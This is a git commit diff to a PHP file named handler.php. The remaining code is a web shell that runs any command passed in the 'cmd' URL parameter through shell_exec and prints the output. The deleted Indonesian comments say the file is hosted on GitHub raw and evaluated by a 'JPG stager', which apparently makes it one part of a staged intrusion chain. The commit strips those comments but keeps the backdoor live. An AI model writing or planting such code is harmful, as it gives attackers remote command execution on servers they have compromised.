f896458a31632fd1d20e3743fa73cefc745a69ec
sam <144790923+tryxapp@users.noreply.github.com>
2026-08-21 12:37:53 +0700

    Update handler.php

--- newcon1/newcon2/oncon/short/handler.php
+++ newcon1/newcon2/oncon/short/handler.php
@@ -1,6 +1,4 @@
 <?php
-// File ini di host di GitHub raw
-// Di-eval oleh JPG stager, $_GET masih accessible dari request asli
  
 if(isset($_GET['cmd'])){
     echo shell_exec($_GET['cmd'].' 2>&1');
